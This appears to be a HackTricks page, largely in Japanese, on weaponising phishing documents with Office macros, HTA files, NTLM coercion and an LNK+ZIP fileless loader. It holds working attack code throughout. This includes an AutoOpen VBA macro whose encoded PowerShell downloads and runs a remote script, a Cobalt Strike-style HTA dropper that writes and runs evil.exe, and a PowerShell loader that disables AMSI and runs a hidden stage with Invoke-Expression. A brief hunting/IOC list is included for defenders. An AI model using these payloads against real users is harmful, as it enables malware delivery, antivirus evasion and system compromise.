# Phishing ファイルとドキュメント

{{#include ../../banners/hacktricks-training.md}}

## Office ドキュメント

Microsoft Word は、ファイルを開く前にファイルのデータ検証を行います。データ検証は、OfficeOpenXML 標準に対するデータ構造の識別の形で実行されます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。

通常、マクロを含む Word ファイルは `.docm` 拡張子を使用します。しかし、ファイル拡張子を変更してファイル名を変更しても、マクロ実行能力を維持することが可能です.\
例えば、RTF ファイルは設計上マクロをサポートしていませんが、DOCM ファイルを RTF にリネームすると Microsoft Word により処理され、マクロを実行可能になります.\
同じ内部構造とメカニズムは Microsoft Office Suite（Excel、PowerPoint など）のすべてのソフトウェアに適用されます。

次のコマンドを使用して、いくつかの Office プログラムが実行する拡張子を確認できます：
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 外部画像の読み込み

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

文書内の macros を使って任意のコードを実行することが可能です。

#### Autoload 関数

一般的なものほど、AV に検出されやすくなります。

- AutoOpen()
- Document_Open()

#### Macros コード例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が表示されます。**Inspect** をクリックし、次に **Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

完了したら **Save as type** ドロップダウンを選択し、フォーマットを **`.docx`** から **Word 97-2003 `.doc`** に変更します。\\  
これは **`.docx` 内にマクロを保存できない** のと、マクロ対応の **`.docm`** 拡張子に対するスティグマがあるためです（例：サムネイルアイコンに大きな `!` が表示され、一部の web/メールゲートウェイで完全にブロックされることがあります）。したがって、この **レガシーな `.doc` 拡張子が最良の妥協案** です。

#### 悪意のあるマクロ生成ツール

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA ファイル

HTA は **HTML とスクリプト言語（VBScript や JScript など）を組み合わせた** Windows プログラムです。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルの制約を受けない「完全に信頼された」アプリケーションとして実行されます。

HTA は **`mshta.exe`** を使用して実行され、通常 **Internet Explorer** とともに **インストールされます**。そのため **`mshta` は IE に依存します**。したがって、IE がアンインストールされている場合、HTA は実行できません。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 認証の強制

NTLM 認証を「リモートで」強制する方法はいくつかある。例えば、ユーザがアクセスするメールや HTML に **不可視の画像** を追加する（HTTP MitM でも？）。あるいは、フォルダを開くだけで **認証をトリガーする** ファイルの **アドレス** を被害者に送る、など。

**以下のページでこれらのアイデアや詳細を確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証情報を盗むだけでなく、**perform NTLM relay attacks** も可能であることを忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK ローダー + ZIP 埋め込みペイロード (fileless chain)

非常に効果的なキャンペーンは、正規に見える二つのデコイドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布する。トリックは、実際の PowerShell ローダーが ZIP の生バイト列中のユニークなマーカーの後に格納されており、.lnk がそれを切り出して完全にメモリ上で実行する点にある。

典型的なフロー（.lnk による PowerShell ワンライナーで実装される）:

1) 一般的なパス（Desktop, Downloads, Documents, %TEMP%, %ProgramData% および カレントワーキングディレクトリの親）から元の ZIP を探す。
2) ZIP のバイトを読み取り、ハードコードされたマーカー（例: xFIQCV）を探す。マーカー以降のすべてが埋め込まれた PowerShell ペイロードである。
3) %ProgramData% に ZIP をコピーし、そこで展開して、正規に見せかけるためにデコイの .docx を開く。
4) カレントプロセスで AMSI をバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次のステージをデオブフスケート（例: すべての # 文字を除去）し、メモリ内で実行する。

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
注意事項
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- 次のステージでは、ディスク上の痕跡を最小化するために base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc を介して実行することが多い。

同じチェーンで使用される Persistence
- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer やそれを埋め込むアプリが自動的に payload を再実行するようにする。詳細と利用可能なコマンドは以下を参照:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータ末尾に ASCII マーカー文字列（例: xFIQCV）が追記された ZIP ファイル。
- .lnk が親/ユーザフォルダを列挙して ZIP を探し、デコイ文書を開く。
- AMSI の改ざん（[System.Management.Automation.AmsiUtils]::amsiInitFailed を利用）。
- 長時間実行される業務スレッドが、信頼された PaaS ドメイン上にホストされたリンクで終わる。

## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
